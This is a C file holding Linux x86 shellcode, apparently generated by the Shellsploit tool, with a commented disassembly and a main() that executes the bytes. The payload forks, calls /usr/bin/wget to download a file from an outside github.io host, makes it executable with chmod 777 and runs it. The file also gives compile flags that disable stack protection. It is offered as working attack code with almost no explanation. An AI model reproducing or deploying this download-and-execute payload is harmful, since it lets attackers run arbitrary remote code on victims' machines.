/*
--------------------------------------------------------------------------------------------------------

[+] Author  : B3mB4m
[~] Contact : b3mb4m@protonmail.com
[~] Project : https://github.com/b3mb4m/Shellsploit
[~] Greetz  : Bomberman,T-Rex,KnocKout,ZoRLu
[~] Poc     : http://imgur.com/hHB4yiQ


#We are still working on ROP Chain, stay tuned :)


"""
You can convert it an elf file:

https://www.virustotal.com/en/file/93c214f7b4362937f05f5732ba2f7f1db53e2a5775ab7bafdba954e691f74c82/analysis/1454113925/

If you want test:
    Important : your filename len must be one byte(Weird bug I'll fix it
soon lol).
    Default settings for http://b3mb4m.github.io/exec/h
    Source codes : b3mb4m.github.io/exec/hello.asm
"""



00000000  31C0              xor eax,eax
00000002  B002              mov al,0x2
00000004  CD80              int 0x80
00000006  31DB              xor ebx,ebx
00000008  39D8              cmp eax,ebx
0000000A  743B              jz 0x47
0000000C  31C9              xor ecx,ecx
0000000E  31DB              xor ebx,ebx
00000010  31C0              xor eax,eax
00000012  6A05              push byte +0x5
00000014  89E1              mov ecx,esp
00000016  89E1              mov ecx,esp
00000018  89E3              mov ebx,esp
0000001A  B0A2              mov al,0xa2
0000001C  CD80              int 0x80
0000001E  31C9              xor ecx,ecx
00000020  31C0              xor eax,eax
00000022  50                push eax
00000023  B00F              mov al,0xf
00000025  6A68              push byte +0x68
00000027  89E3              mov ebx,esp
00000029  31C9              xor ecx,ecx
0000002B  66B9FF01          mov cx,0x1ff
0000002F  CD80              int 0x80
00000031  31C0              xor eax,eax
00000033  50                push eax
00000034  6A68              push byte +0x68
00000036  89E3              mov ebx,esp
00000038  50                push eax
00000039  89E2              mov edx,esp
0000003B  53                push ebx
0000003C  89E1              mov ecx,esp
0000003E  B00B              mov al,0xb
00000040  CD80              int 0x80
00000042  31C0              xor eax,eax
00000044  40                inc eax
00000045  CD80              int 0x80
00000047  6A0B              push byte +0xb
00000049  58                pop eax
0000004A  99                cdq
0000004B  52                push edx
0000004C  6865632F68        push dword 0x682f6365
00000051  682F2F6578        push dword 0x78652f2f
00000056  68622E696F        push dword 0x6f692e62
0000005B  6869746875        push dword 0x75687469
00000060  68346D2E67        push dword 0x672e6d34
00000065  6862336D62        push dword 0x626d3362
0000006A  89E1              mov ecx,esp
0000006C  52                push edx
0000006D  6A74              push byte +0x74
0000006F  682F776765        push dword 0x6567772f
00000074  682F62696E        push dword 0x6e69622f
00000079  682F757372        push dword 0x7273752f
0000007E  89E3              mov ebx,esp
00000080  52                push edx
00000081  51                push ecx
00000082  53                push ebx
00000083  89E1              mov ecx,esp
00000085  CD80              int 0x80
*/

//Project : https://github.com/b3mb4m/Shellsploit
//This file created with shellsploit ..
//30/01/2016 - 02:59:21
//Compile : gcc -fno-stack-protector -z execstack shell.c -o shell

unsigned char shellcode[] =
"\x31\xc0\xb0\x02\xcd\x80\x31\xdb\x39\xd8\x74\x3b\x31\xc9\x31\xdb\x31\xc0\x6a\x05\x89\xe1\x89\xe1\x89\xe3\xb0\xa2\xcd\x80\x31\xc9\x31\xc0\x50\xb0\x0f\x6a\x68\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x31\xc0\x50\x6a\x68\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x6a\x0b\x58\x99\x52\x68\x65\x63\x2f\x68\x68\x2f\x2f\x65\x78\x68\x62\x2e\x69\x6f\x68\x69\x74\x68\x75\x68\x34\x6d\x2e\x67\x68\x62\x33\x6d\x62\x89\xe1\x52\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";

int main(void){
    (*(void(*)()) shellcode)();
}